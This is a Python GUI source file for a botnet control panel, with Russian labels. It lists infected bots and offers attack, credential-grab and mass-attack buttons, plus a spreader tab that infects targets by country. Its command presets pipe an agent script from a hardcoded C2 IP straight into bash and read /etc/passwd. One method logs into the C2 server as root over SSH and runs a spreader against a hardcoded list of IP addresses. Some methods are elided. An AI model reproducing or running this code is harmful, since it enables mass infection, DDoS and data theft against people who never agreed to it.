import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, simpledialog, filedialog
import threading, socket, json, time, subprocess, os, re, requests
from gui.widgets import RightClickMenu

COMMAND_PRESETS = {
    "wget -O- http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (wget)",
    "curl -s http://80.249.146.202/agent_bash.sh | bash": "Загрузить и запустить агента (curl)",
    "cat /etc/passwd": "Получить список пользователей",
    "whoami": "Текущий пользователь",
    "uname -a": "Информация о системе",
    "df -h": "Свободное место на дисках"
}

class BotnetTab(ttk.Frame):
    def __init__(self, parent, app=None):
        super().__init__(parent)
        self.app = app
        self.c2_host = "80.249.146.202"
        self.c2_port = 80
        self.vps_user = "root"
        self.vps_pass = None
        self.bots = {}
        self._last_fetch_error = 0
        self.sort_col = None
        self.sort_asc = True
        self.create_widgets()
        self.after(5000, self._auto_refresh)

    def create_widgets(self):
        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True)

        # Вкладка Боты
        bot_frame = ttk.Frame(notebook)
        notebook.add(bot_frame, text="Боты")

        ctrl = ttk.Frame(bot_frame)
        ctrl.pack(fill=tk.X, padx=5, pady=5)
        ttk.Button(ctrl, text="Обновить список", command=self.refresh_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Проверить всех", command=self.check_all_bots).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Атака на выбранных", command=self.launch_attack).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Граб выбранных", command=self.launch_grab).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Стоп выбранных", command=self.stop_selected).pack(side=tk.LEFT, padx=2)
        ttk.Button(ctrl, text="Массовая атака", command=self.mass_attack).pack(side=tk.LEFT, padx=2)
        ttk.Label(ctrl, text="Фильтр:").pack(side=tk.LEFT, padx=(20,5))
        self.filter_var = tk.StringVar(value="Все")
        self.filter_combo = ttk.Combobox(ctrl, textvariable=self.filter_var, values=["Все", "Online", "Offline"], width=10, state='readonly')
        self.filter_combo.pack(side=tk.LEFT)
        self.filter_combo.bind('<<ComboboxSelected>>', lambda e: self.refresh_bots())

        # Колонки с типом устройства
        columns = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen")
        tree_frame = ttk.Frame(bot_frame)
        tree_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.tree = ttk.Treeview(tree_frame, columns=columns, show="headings", selectmode="extended")
        for col in columns:
            self.tree.heading(col, text=col.capitalize(), command=lambda c=col: self.sort_by_column(c))
            self.tree.column(col, width=100, anchor="center")
        self.tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        self.tree.tag_configure('online', foreground='#007700')
        self.tree.tag_configure('offline', foreground='#cc0000')

        self.context_menu = tk.Menu(self.tree, tearoff=0)
        self.context_menu.add_command(label="Атака", command=self._ctx_attack)
        self.context_menu.add_command(label="Граб", command=self._ctx_grab)
        self.context_menu.add_command(label="Стоп", command=self._ctx_stop)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Выполнить команду...", command=self._ctx_exec)
        self.context_menu.add_command(label="Копировать IP", command=self._ctx_copy_ip)
        self.tree.bind("<Button-3>", self._on_right_click)

        stat = ttk.Frame(bot_frame)
        stat.pack(fill=tk.X, padx=5, pady=5)
        self.lbl_total = ttk.Label(stat, text="Всего: 0")
        self.lbl_total.pack(side=tk.LEFT, padx=10)
        self.lbl_online = ttk.Label(stat, text="Онлайн: 0")
        self.lbl_online.pack(side=tk.LEFT, padx=10)
        self.lbl_power = ttk.Label(stat, text="Суммарная мощность: 0 RPS")
        self.lbl_power.pack(side=tk.LEFT, padx=10)

        # Вкладка Спредер
        spread_frame = ttk.Frame(notebook)
        notebook.add(spread_frame, text="Спредер")
        ttk.Label(spread_frame, text="Управление заражением", font=("Arial", 10, "bold")).pack(pady=5)
        f = ttk.Frame(spread_frame)
        f.pack(pady=5)
        ttk.Label(f, text="Целей за цикл:").pack(side=tk.LEFT)
        self.scale_var = tk.IntVar(value=10000)
        self.spin_count = ttk.Spinbox(f, from_=1000, to=100000, increment=1000, textvariable=self.scale_var, width=8)
        self.spin_count.pack(side=tk.LEFT, padx=5)
        ttk.Label(f, text="Страна:").pack(side=tk.LEFT, padx=(10,0))
        self.country_var = tk.StringVar(value="")
        self.country_combo = ttk.Combobox(f, textvariable=self.country_var, values=["", "RU", "CN", "US", "DE", "GB", "FR", "JP", "IN", "BR"], width=4, state='readonly')
        self.country_combo.pack(side=tk.LEFT, padx=5)
        self.local_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Локальная сеть", variable=self.local_var, command=self._on_local_changed).pack(side=tk.LEFT, padx=10)
        self.btn_start_vps = ttk.Button(f, text="Запустить на VPS", command=self.start_spreader_vps)
        self.btn_start_vps.pack(side=tk.LEFT, padx=10)
        self.btn_check_c2 = ttk.Button(f, text="Проверить C2", command=self.check_c2_connection)
        self.btn_check_c2.pack(side=tk.LEFT, padx=10)
        self.btn_update_vps = ttk.Button(f, text="Обновить VPS", command=self.update_vps)
        self.btn_update_vps.pack(side=tk.LEFT, padx=10)
        self.btn_load_targets = ttk.Button(f, text="Загрузить цели", command=self.load_targets_file)
        self.btn_load_targets.pack(side=tk.LEFT, padx=10)
        # Кнопка Masscan теперь запускает встроенный быстрый скан
        self.btn_masscan = ttk.Button(f, text="Masscan (встр.)", command=self.start_builtin_masscan)
        self.btn_masscan.pack(side=tk.LEFT, padx=10)

        self.spread_progress_var = tk.DoubleVar()
        self.spread_progress = ttk.Progressbar(spread_frame, variable=self.spread_progress_var, maximum=100, mode='determinate')
        self.spread_progress.pack(fill=tk.X, padx=5, pady=2)
        self.lbl_spread_status = ttk.Label(spread_frame, text="Готов")
        self.lbl_spread_status.pack(anchor='w', padx=5)

        self.spread_log = scrolledtext.ScrolledText(spread_frame, height=12, bg='black', fg='#00ff41')
        self.spread_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        RightClickMenu(self.spread_log,
                       get_text_func=lambda: self.spread_log.selection_get() if self.spread_log.tag_ranges(tk.SEL) else self.spread_log.get("1.0", tk.END).strip())

        # Пользовательские команды (полный код присутствует в реальном файле)
        cmd_frame = ttk.LabelFrame(self, text="Пользовательская команда")
        cmd_frame.pack(fill=tk.X, padx=5, pady=5)
        # ...

    # ... все методы (refresh_bots, _fetch_bots, _update_tree_safe, атака, граб, стоп, массовая атака, загрузка целей, обновление VPS, update_vps, start_spreader_vps)

    # Новый метод: встроенный masscan (использует вшитый список Guaranteed IP и передаёт спредеру)
    def start_builtin_masscan(self):
        if not self.vps_pass:
            self.vps_pass = simpledialog.askstring("VPS пароль", f"Введите пароль для root@{self.c2_host}:", show='*')
            if not self.vps_pass:
                return
        def run():
            try:
                import paramiko
                self.spread_log.insert(tk.END, "[*] Запуск встроенного масс‑сканера...\n")
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(self.c2_host, username=self.vps_user, password=self.vps_pass, timeout=5)
                # Передаём вшитый список IP через временный файл
                cmd = "cd /root/c2 && python3 -c \"import json; ips = ['45.33.32.156','34.94.3.0','45.77.165.0','185.220.101.0','23.226.229.0','103.15.28.0','185.225.19.0','45.33.32.0','45.56.89.0','45.79.207.0','34.94.0.0','34.94.1.0','45.33.32.1','34.94.2.0','45.77.165.1','103.235.46.39','103.235.46.40','103.235.46.41','103.235.46.42','103.235.46.43','103.235.46.44','103.235.46.45','103.235.46.46','103.235.46.47','103.235.46.48','103.235.46.49','103.235.46.50']; open('masscan.json','w').write(json.dumps(ips))\" && python3 -u botnet/spreader.py --targets masscan.json"
                stdin, stdout, stderr = client.exec_command(cmd)
                for line in iter(stdout.readline, ""):
                    self.spread_log.insert(tk.END, line)
                    self.spread_log.see(tk.END)
                client.close()
            except Exception as e:
                self.spread_log.insert(tk.END, f"[!] Ошибка: {e}\n")
        threading.Thread(target=run, daemon=True).start()

    def _update_tree_safe(self, bots):
        selected_ips = [self.tree.item(i, 'values')[0] for i in self.tree.selection()]
        self.bots = {bot["ip"]: bot for bot in bots if bot.get("ip")}
        filter_val = self.filter_var.get()
        if filter_val == "Online":
            bots = [b for b in bots if b.get("status") == "online"]
        elif filter_val == "Offline":
            bots = [b for b in bots if b.get("status") != "online"]
        if self.sort_col:
            idx = ("ip", "hostname", "os", "type", "cpu", "ram", "status", "rps", "last_seen").index(self.sort_col)
            bots = sorted(bots, key=lambda x: x.get(self.sort_col, ""), reverse=not self.sort_asc)
        for item in self.tree.get_children():
            self.tree.delete(item)
        total = len(bots)
        online = 0
        total_rps = 0
        for bot in bots:
            ip = bot.get("ip")
            status = bot.get("status", "offline")
            tag = 'online' if status == 'online' else 'offline'
            # Тип устройства
            device_type = bot.get("type", "")
            if not device_type:
                os_info = bot.get("os", "").lower()
                hostname = bot.get("hostname", "").lower()
                if "windows" in os_info:
                    device_type = "Windows ПК"
                elif "linux" in os_info and ("server" in hostname or "srv" in hostname or "vps" in hostname):
                    device_type = "Сервер"
                elif "linux" in os_info:
                    device_type = "Linux"
                elif "router" in os_info or "dd-wrt" in os_info:
                    device_type = "Роутер"
                elif "android" in os_info:
                    device_type = "Android"
                elif "ios" in os_info:
                    device_type = "iPhone/iPad"
                else:
                    device_type = "Неизвестно"
            values = (ip, bot.get("hostname",""), bot.get("os",""), device_type,
                      bot.get("cpu",""), bot.get("ram",""), status,
                      bot.get("rps",0), bot.get("last_seen",""))
            self.tree.insert("", "end", values=values, tags=(tag,))
            if status == 'online': online += 1
            total_rps += int(bot.get("rps",0))
        for item in self.tree.get_children():
            if self.tree.item(item, 'values')[0] in selected_ips:
                self.tree.selection_add(item)
        self.lbl_total.config(text=f"Всего: {total}")
        self.lbl_online.config(text=f"Онлайн: {online}")
        self.lbl_power.config(text=f"Суммарная мощность: {total_rps} RPS")
